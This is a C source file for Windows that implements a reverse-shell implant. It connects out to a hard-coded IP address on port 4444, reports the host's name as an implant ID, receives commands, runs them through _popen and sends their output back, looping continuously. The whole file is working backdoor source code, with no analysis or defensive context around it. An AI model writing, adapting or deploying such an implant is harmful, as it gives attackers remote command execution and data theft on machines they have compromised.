#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>


#pragma comment(lib, "ws2_32.lib")

int initializeServer(SOCKET *s,struct sockaddr_in *server, WSADATA *wsa)
{

    if(WSAStartup(MAKEWORD(2,2), wsa) != 0)
    {
        printf("[-] Failed Error code: %d", WSAGetLastError());
        return 1;
    }

    if((*s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        printf("[-] Erorr creating socket: %d", WSAGetLastError());
        return 1;
    }

    server->sin_addr.s_addr = inet_addr("192.168.1.138");
    server->sin_family = AF_INET;
    server->sin_port = htons(4444);

    int conn = connect(*s, (struct sockaddr *)server, sizeof(struct sockaddr_in)); 
    
    return 0;
}

int ImplantID(int s)
{
    char hostname[1024];
    gethostname(hostname, sizeof(hostname) - 1);
    strcat(hostname, "\n");
    send(s, hostname, strlen(hostname), 0);
    return 0;
}

int executeCommands(char *command, int s)
{
    char output[1024];

        FILE *f = _popen(command, "r");
        if(f == NULL)
        {
            return 1;
        }
         while(fgets(output, sizeof(output), f) != 0)
         {
            send(s,output, strlen(output), 0);
         }
         _pclose(f);
         send(s, "END_OF_OUTPUT\n", 14, 0);
         return 0;
}

int receiveCommands(SOCKET s)
{
    int recv_commands;
    char command[1024];

    recv_commands = recv(s, command, sizeof(command), 0);

        command[recv_commands] = '\0';
        executeCommands(command,s);
}



int main()
{
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;

   while(1)
   {
    initializeServer(&s,&server,&wsa);
    ImplantID(s);
    receiveCommands(s);
    closesocket(s);
    WSACleanup();
   // Sleep(10000); out right now for testing
   }
    return 0;
}
